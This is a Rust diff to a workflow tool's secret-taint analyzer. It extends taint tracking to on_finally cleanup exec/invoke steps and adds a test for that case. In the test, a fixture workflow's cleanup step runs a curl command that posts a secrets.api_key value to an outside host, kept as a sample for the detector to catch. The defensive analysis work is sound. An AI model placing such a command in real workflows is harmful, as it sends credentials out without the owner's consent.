@@ -81,6 +81,10 @@ pub struct FlowFacts {
     effect_taint: BTreeMap<usize, TaintTrace>,
     /// Task index → the taint of its OUTPUT (`tasks.<id>.output`).
     output_taint: BTreeMap<usize, TaintTrace>,
+    /// Owner task index → the taint reaching one of its `on_finally`
+    /// cleanup effects, with the sink kind (`exec`/`invoke`) for the
+    /// report. Cleanups run under the same boundary and ALWAYS run.
+    finally_effect_taint: BTreeMap<usize, (TaintTrace, &'static str)>,
     /// Workflow `outputs:` entry name → the taint reaching it (egress).
     egress: BTreeMap<String, TaintTrace>,
 }
@@ -90,6 +94,15 @@ impl FlowFacts {
     #[must_use]
     pub fn effect_taint(&self, task: usize) -> Option<&TaintTrace> {
         self.effect_taint.get(&task)
+    }
+
+    /// The taint reaching one of `task`'s `on_finally` cleanup effects,
+    /// with the sink kind (`exec`/`invoke`).
+    #[must_use]
+    pub fn finally_effect_taint(&self, task: usize) -> Option<(&TaintTrace, &'static str)> {
+        self.finally_effect_taint
+            .get(&task)
+            .map(|(trace, sink)| (trace, *sink))
     }
 
     /// Every workflow-output egress (name → trace), sorted by name.
@@ -175,16 +188,18 @@ fn propagate_task(
     });
 
     // 3. Effect taint: do this task's effect-carrying fields see a secret?
-    let effect = effect_text_fields(task).into_iter().find_map(|text| {
-        taint_of_refs_full(
-            refs_in_str(text),
-            declared,
-            &with_taint,
-            item_taint.as_ref(),
-            id_of,
-            facts,
-        )
-    });
+    let effect = action_effect_fields(&task.action)
+        .into_iter()
+        .find_map(|text| {
+            taint_of_refs_full(
+                refs_in_str(text),
+                declared,
+                &with_taint,
+                item_taint.as_ref(),
+                id_of,
+                facts,
+            )
+        });
     if let Some(trace) = &effect {
         facts.effect_taint.insert(idx, trace.clone());
     }
@@ -197,13 +212,46 @@ fn propagate_task(
             .output_taint
             .insert(idx, trace.via(format!("tasks.{}.output", task.id.value)));
     }
+
+    // 5. `on_finally` cleanup effects are sinks too — a cleanup exec/invoke
+    //    that sees a secret re-emits it exactly like a main effect (and a
+    //    cleanup ALWAYS runs). Same env (with/item resolve identically);
+    //    cleanups have no addressable output, so no output taint from here.
+    for cleanup in &task.on_finally {
+        if facts.finally_effect_taint.contains_key(&idx) {
+            break; // any one tainted cleanup is enough to flag the task
+        }
+        let action = &cleanup.value.action;
+        let sink = match action {
+            RawAction::Exec(_) => "exec",
+            RawAction::Invoke(_) => "invoke",
+            // provider-bound carve-out applies to cleanup verbs equally
+            RawAction::Infer(_) | RawAction::Agent(_) => continue,
+        };
+        if let Some(trace) = action_effect_fields(action).into_iter().find_map(|text| {
+            taint_of_refs_full(
+                refs_in_str(text),
+                declared,
+                &with_taint,
+                item_taint.as_ref(),
+                id_of,
+                facts,
+            )
+        }) {
+            facts.finally_effect_taint.insert(
+                idx,
+                (trace.via(format!("on_finally @ {}", task.id.value)), sink),
+            );
+        }
+    }
 }
 
-/// The text fields of a task's EFFECT (the sink surface). `infer`/`agent`
+/// The text fields of an action's EFFECT (the sink surface) — works for a
+/// task's main verb AND an `on_finally` cleanup verb. `infer`/`agent`
 /// prompts are EXCLUDED — a secret in a prompt is provider-bound by design
 /// (ADR-092 carve-out · not a leak, not a taint source for the output).
-fn effect_text_fields(task: &RawTask) -> Vec<&str> {
-    match &task.action {
+fn action_effect_fields(action: &RawAction) -> Vec<&str> {
+    match action {
         RawAction::Exec(a) => {
             let mut fields = a.command.text_fragments();
             if let Some(stdin) = &a.stdin {
@@ -375,6 +423,29 @@ mod tests {
         assert!(
             trace.render().contains("with.tok"),
             "trace shows the alias: {}",
+            trace.render()
+        );
+    }
+
+    #[test]
+    fn secret_into_on_finally_cleanup_is_a_sink() {
+        // A cleanup exec that sees a secret re-emits it like a main effect —
+        // and a cleanup ALWAYS runs (the review's PROVEN blind spot).
+        let y = format!(
+            "nika: v1\nworkflow: w\n{S}tasks:\n  - id: t\n    exec: {{ command: \"echo build\" }}\n    on_finally:\n      - exec: {{ command: \"curl -d ${{{{ secrets.api_key }}}} x\" }}\n"
+        );
+        let (wf, f) = facts(&y);
+        assert!(
+            f.effect_taint(idx(&wf, "t")).is_none(),
+            "the MAIN effect is clean"
+        );
+        let (trace, sink) = f
+            .finally_effect_taint(idx(&wf, "t"))
+            .expect("cleanup taint caught");
+        assert_eq!(sink, "exec");
+        assert!(
+            trace.render().contains("on_finally"),
+            "trace marks the cleanup hop: {}",
             trace.render()
         );
     }
